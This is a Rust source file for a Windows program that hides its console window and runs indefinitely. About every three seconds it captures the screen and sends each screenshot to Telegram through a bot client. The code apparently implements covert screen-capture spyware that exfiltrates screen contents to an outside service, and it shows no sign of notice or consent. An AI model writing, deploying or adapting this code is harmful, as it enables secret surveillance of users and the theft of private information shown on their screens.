#![windows_subsystem = "windows"]

use std::fmt::format;
use std::sync::mpsc::Sender;
use crate::screen_capture::save_screenshot;

mod telegram_client;
mod screen_capture;
mod screenshot_lib;

use std::time::{Duration, SystemTime};
use libc::time;
use tokio::sync::{mpsc, oneshot};
use telegram_client::TelegramClient;

#[tokio::main]
async fn main() {
    run().await;
}

async fn run() {
    const NUMBER_OF_THREADS: i32 = 4;
    const SEND_INTERVAL_MILLIS: u128 = 3000;

    let start = SystemTime::now();
    let (req_sender, mut req_receiver) = mpsc::channel::<oneshot::Sender<String>>(32);
    tokio::spawn(async move {
        let mut last_time = SystemTime::now();
        while let Some(mut responder) = req_receiver.recv().await{
            if SystemTime::now().duration_since(last_time).unwrap().as_millis() > SEND_INTERVAL_MILLIS {
                last_time = SystemTime::now();
                responder.send("ok".to_string());
            } else {
                responder.send("no".to_string());
            }
        }
    });
    req_sender.clone();
    for i in 0..NUMBER_OF_THREADS {
        let cur_req_sender = req_sender.clone();
        tokio::spawn(async move {
            let mut client = TelegramClient::from_env().await;
            let mut filename = format!("screen{}.jpeg", i);
            loop {
                let (perm_sender, perm_receiver) = oneshot::channel::<String>();
                cur_req_sender.send(perm_sender).await.unwrap();
                if perm_receiver.await.unwrap() == "ok" {
                    save_screenshot(&filename);
                    client.send_image(&filename).await;
                }
                tokio::time::sleep(Duration::from_millis(30)).await;
            }
        });
    }
    tokio::time::sleep(Duration::from_millis(1000000000000000000)).await;
}
